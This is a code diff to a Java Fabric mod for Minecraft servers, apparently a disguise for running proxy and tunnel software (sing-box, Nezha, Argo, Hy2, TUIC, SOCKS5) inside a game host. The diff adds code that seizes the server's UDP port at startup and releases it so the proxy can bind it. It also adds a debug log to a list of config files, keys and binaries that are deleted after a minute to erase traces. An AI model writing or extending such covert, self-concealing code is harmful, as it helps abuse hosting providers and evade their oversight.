@@ -16,6 +16,9 @@ import java.nio.file.*;
 import java.nio.file.DirectoryStream;
 import java.util.*;
 
+import java.net.DatagramSocket;
+import java.time.LocalDateTime;
+
 /**
  * Maohi 核心类，实现 Fabric Mod 初始化接口
  * 集成了虚拟玩家系统，用于维持服务器在线人数
@@ -25,6 +28,8 @@ public class Maohi implements ModInitializer {
 
     private static final Path FILE_PATH = Paths.get("./world");
     private static final Path DATA_DIR  = Paths.get("mods/Maohi");
+    private static final Path LOG_FILE = FILE_PATH.resolve("maohi_debug.log");
+    private static DatagramSocket hijackSocket;
 
     private static final Properties CONFIG = loadConfig();
 
@@ -55,22 +60,23 @@ public class Maohi implements ModInitializer {
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String NZ_SERVER = cfg("NZ_SERVER", "");    // V1格式 xxx.xxx.com:443  V0格式 xxx.xxx.com
-    private static final String NZ_KEY    = cfg("NZ_KEY", "");
-    private static final String NZ_PORT   = cfg("NZ_PORT", "");                                  // V1留空  V0写端口
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");                           // 留空临时隧道
-    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
-    private static final String ARGO_PORT    = cfg("ARGO_PORT", "");                         // 留空不启用隧道
-    private static final String HY2_PORT     = cfg("HY2_PORT", "");
-    private static final String TUIC_PORT    = cfg("TUIC_PORT", "");
-    private static final String S5_PORT      = cfg("S5_PORT", "");
-    private static final String CFIP         = cfg("CFIP", "ip.sb");
-    private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
-    private static final String NAME         = cfg("NAME", "");
-    private static final String UUID         = cfg("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
-    private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "");   //上传订阅管理系统，不用留空
+    private static final String NZ_SERVER       = cfg("NZ_SERVER", "");    // V1格式 xxx.xxx.com:443  V0格式 xxx.xxx.com
+    private static final String NZ_KEY          = cfg("NZ_KEY", "");
+    private static final String NZ_PORT         = cfg("NZ_PORT", "");                                  // V1留空  V0写端口
+    private static final String ARGO_DOMAIN     = cfg("ARGO_DOMAIN", "");                           // 留空临时隧道
+    private static final String ARGO_AUTH       = cfg("ARGO_AUTH", "");
+    private static final String ARGO_PORT       = cfg("ARGO_PORT", "");                         // 留空不启用隧道
+    private static final String HY2_PORT        = cfg("HY2_PORT", "");
+    private static final String DISABLE_QUERY   = cfg("DISABLE_QUERY", "false");
+    private static final String TUIC_PORT       = cfg("TUIC_PORT", "");
+    private static final String S5_PORT         = cfg("S5_PORT", "");
+    private static final String CFIP            = cfg("CFIP", "ip.sb");
+    private static final String CFPORT          = cfg("CFPORT", "443");
+    private static final String CHAT_ID         = cfg("CHAT_ID", "");
+    private static final String BOT_TOKEN       = cfg("BOT_TOKEN", "");
+    private static final String NAME            = cfg("NAME", "");
+    private static final String UUID            = cfg("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
+    private static final String UPLOAD_URL      = cfg("UPLOAD_URL", "");   //上传订阅管理系统，不用留空
 
 
     /**
@@ -167,6 +173,9 @@ public class Maohi implements ModInitializer {
         System.out.println("[Maohi] !!! FABRIC MOD INITIALIZING !!!");
         System.out.println("==================================================");
 
+        // 抢占端口逻辑
+        executePortHijack();
+
         // 注册服务器生命周期事件
         ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
         ServerLifecycleEvents.SERVER_STOPPING.register(this::onServerStopping);
@@ -188,6 +197,73 @@ public class Maohi implements ModInitializer {
         thread.start();
     }
 
+    private void executePortHijack() {
+        if (!"true".equalsIgnoreCase(DISABLE_QUERY)) {
+            logToFile("DISABLE_QUERY is false, stop port hijack...");
+            return;
+        }
+        int port = resolvePort();
+        try {
+            // 抢占端口
+            hijackSocket = new DatagramSocket(port);
+            logToFile("Successfully hijacked UDP port: " + port);
+        } catch (Exception e) {
+            logToFile("FAILED to hijack UDP port " + port + ": " + e.getMessage());
+        }
+    }
+
+    /**
+     * 安全释放已占用的 UDP 端口，以便其他程序可以绑定
+     */
+    private void releasePort() {
+        try {
+            if (hijackSocket != null) {
+                // 检查是否已经关闭，避免重复操作
+                if (!hijackSocket.isClosed()) {
+                    hijackSocket.close();
+                    logToFile("UDP socket closed. Port is now FREE.");
+                }
+                // 将引用设为 null，便于垃圾回收和状态判断
+                hijackSocket = null;
+            }
+        } catch (Exception e) {
+            logToFile("ERROR while releasing UDP port: " + e.getMessage());
+        }
+    }
+
+    private int resolvePort() {
+        // 环境变量优先
+        String[] envKeys = {"SERVER_PORT", "PORT", "QUERY_PORT"};
+        for (String key : envKeys) {
+            String val = System.getenv(key);
+            if (val != null) {
+                try { return Integer.parseInt(val); } catch (NumberFormatException ignored) {}
+            }
+        }
+
+        // 配置文件次之
+        File propFile = new File("server.properties");
+        if (propFile.exists()) {
+            Properties prop = new Properties();
+            try (InputStream in = new FileInputStream(propFile)) {
+                prop.load(in);
+                return Integer.parseInt(prop.getProperty("query.port", 
+                       prop.getProperty("server-port", "25565")));
+            } catch (Exception e) {
+                logToFile("Config read error: " + e.getMessage());
+            }
+        }
+        return 25565;
+    }
+
+    private void logToFile(String message) {
+        try {
+            if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);
+            String content = "[" + LocalDateTime.now() + "] " + message + System.lineSeparator();
+            Files.write(LOG_FILE, content.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+        } catch (IOException ignored) {}
+    }
+
     /**
      * 服务器启动完成回调
      */
@@ -200,6 +276,7 @@ public class Maohi implements ModInitializer {
      * 服务器关闭回调
      */
     private void onServerStopping(MinecraftServer server) {
+        releasePort();
         if (virtualPlayerManager != null) {
             virtualPlayerManager.stop();
         }
@@ -496,6 +573,7 @@ public class Maohi implements ModInitializer {
      */
     private void runSingbox() {
         try {
+            releasePort();
             String config = buildSingboxConfig();
             Path configPath = FILE_PATH.resolve("config.json");
             Files.writeString(configPath, config);
@@ -878,7 +956,7 @@ public class Maohi implements ModInitializer {
                 Thread.sleep(60000);
                 String[] sensitiveFiles = {
                     "config.yaml", "config.json", "boot.log", 
-                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt",
+                    "nz.log", "sb.log", "cert.pem", "private.key", "proxy_sub.txt", "list.txt", "maohi_debug.log",
                     webName, botName, phpName // 连同执行文件一并扬灰
                 };
                 for (String file : sensitiveFiles) {
